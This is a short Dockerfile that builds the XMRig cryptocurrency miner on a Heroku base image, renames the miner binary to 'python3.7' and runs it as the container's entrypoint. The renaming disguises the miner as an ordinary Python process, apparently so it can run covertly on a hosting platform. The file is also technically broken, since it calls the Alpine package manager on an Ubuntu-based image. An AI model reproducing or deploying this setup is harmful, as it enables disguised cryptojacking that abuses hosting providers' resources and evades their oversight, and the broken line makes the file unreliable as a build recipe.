FROM heroku/heroku:20-build
RUN apk add --no-cache git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev
RUN apt-get update
RUN apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
RUN git clone https://github.com/xmrig/xmrig

RUN mkdir xmrig/build && cd xmrig/build && \
    cmake .. && \
    make -j$(nproc) && \
    chmod +x xmrig && \
    rm -r /xmrig/src
COPY config.json /xmrig/build/config.json
WORKDIR /xmrig/build
RUN mv xmrig python3.7
ENTRYPOINT ["./python3.7"]
